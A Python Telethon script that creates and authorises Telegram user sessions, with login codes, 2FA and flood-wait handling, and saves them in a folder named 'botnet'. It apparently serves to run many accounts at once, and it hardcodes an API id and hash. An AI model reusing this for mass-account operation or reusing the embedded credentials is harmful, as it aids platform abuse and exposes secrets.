from telethon import TelegramClient
from telethon.errors import FloodWaitError
import os
import asyncio
from pathlib import Path
import config

auth_states = {}
flood_wait_times = {}

async def create_session(api_id, api_hash, phone_number, user_data=None):
    session_name = f'/sdcard/botnet/tele_sessions/{phone_number}'
    
    Path('/sdcard/botnet/tele_sessions/').mkdir(parents=True, exist_ok=True)
   
    try:
        client = TelegramClient(session_name, api_id, api_hash)
        
        if user_data:
            auth_states[phone_number] = {'client': client, 'step': 'code'}
            
        await client.start(phone=phone_number)
        print(f'Session created for {phone_number} in /sdcard/botnet/tele_sessions/')
        await client.disconnect()
        
        if phone_number in auth_states:
            del auth_states[phone_number]
        if phone_number in flood_wait_times:
            del flood_wait_times[phone_number]
            
        return {'success': True, 'session_name': session_name}
    except FloodWaitError as e:
        wait_time = e.seconds
        flood_wait_times[phone_number] = wait_time
        return {'success': False, 'flood_wait': wait_time, 'error': f'Flood wait {wait_time} seconds'}
    except Exception as e:
        error_msg = str(e)
        if 'code' in error_msg.lower() and user_data:
            return {'success': False, 'need_code': True, 'error': error_msg}
        return {'success': False, 'error': error_msg}


async def send_code(phone_number, api_id, api_hash):
    if phone_number in flood_wait_times:
        wait_time = flood_wait_times[phone_number]
        return {'success': False, 'flood_wait': wait_time, 'error': f'Need to wait {wait_time} seconds'}
    
    session_name = f'/sdcard/botnet/tele_sessions/{phone_number}'
    
    try:
        client = TelegramClient(session_name, api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            auth_states[phone_number] = {'client': client, 'step': 'code'}
            return {'success': True, 'phone': phone_number}
        else:
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
    except FloodWaitError as e:
        wait_time = e.seconds
        flood_wait_times[phone_number] = wait_time
        asyncio.create_task(clear_flood_wait(phone_number, wait_time))
        return {'success': False, 'flood_wait': wait_time, 'error': f'Flood wait {wait_time} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


async def clear_flood_wait(phone_number, wait_time):
    await asyncio.sleep(wait_time)
    if phone_number in flood_wait_times:
        del flood_wait_times[phone_number]


async def verify_code(phone_number, code):
    state = auth_states.get(phone_number)
    if not state or 'client' not in state:
        return {'success': False, 'error': 'Сессия не найдена. Начните заново.'}
    
    client = state['client']
    
    try:
        await client.sign_in(phone_number, code)
        await client.disconnect()
        
        if phone_number in auth_states:
            del auth_states[phone_number]
        if phone_number in flood_wait_times:
            del flood_wait_times[phone_number]
            
        return {'success': True, 'session_name': f'/sdcard/botnet/tele_sessions/{phone_number}'}
        
    except FloodWaitError as e:
        wait_time = e.seconds
        flood_wait_times[phone_number] = wait_time
        return {'success': False, 'flood_wait': wait_time, 'error': f'Flood wait {wait_time} seconds'}
    except Exception as e:
        if 'password' in str(e).lower():
            return {'success': False, 'need_password': True, 'error': str(e)}
        return {'success': False, 'error': str(e)}


async def verify_2fa(phone_number, password):
    state = auth_states.get(phone_number)
    if not state or 'client' not in state:
        return {'success': False, 'error': 'Сессия не найдена'}
    
    client = state['client']
    
    try:
        await client.sign_in(password=password)
        await client.disconnect()
        
        if phone_number in auth_states:
            del auth_states[phone_number]
        if phone_number in flood_wait_times:
            del flood_wait_times[phone_number]
            
        return {'success': True, 'session_name': f'/sdcard/botnet/tele_sessions/{phone_number}'}
        
    except FloodWaitError as e:
        wait_time = e.seconds
        flood_wait_times[phone_number] = wait_time
        return {'success': False, 'flood_wait': wait_time, 'error': f'Flood wait {wait_time} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def list_sessions():
    
    sessions_dir = '/sdcard/botnet/tele_sessions/'
    
    if not os.path.exists(sessions_dir):
        os.makedirs(sessions_dir, exist_ok=True)
        return []
    
    sessions = []
    try:
        for file in os.listdir(sessions_dir):
            if file.endswith('.session'):
               
                session_name = file.replace('.session', '')
                sessions.append(session_name)
    except Exception as e:
        print(f"Error listing sessions: {e}")
    
    return sessions


async def get_client(session_name):
    
    session_path = f'/sdcard/botnet/tele_sessions/{session_name}'
    client = TelegramClient(session_path, config.API_ID, config.API_HASH)
    await client.connect()
    return client


async def main():
    api_id = '20401021'
    api_hash = '7fa6c7f62816334c230cebf77c565c3d'
    phone_number = input('Введите номер телефона: ')
    result = await create_session(api_id, api_hash, phone_number)
    print(result)

if __name__ == '__main__':
    asyncio.run(main())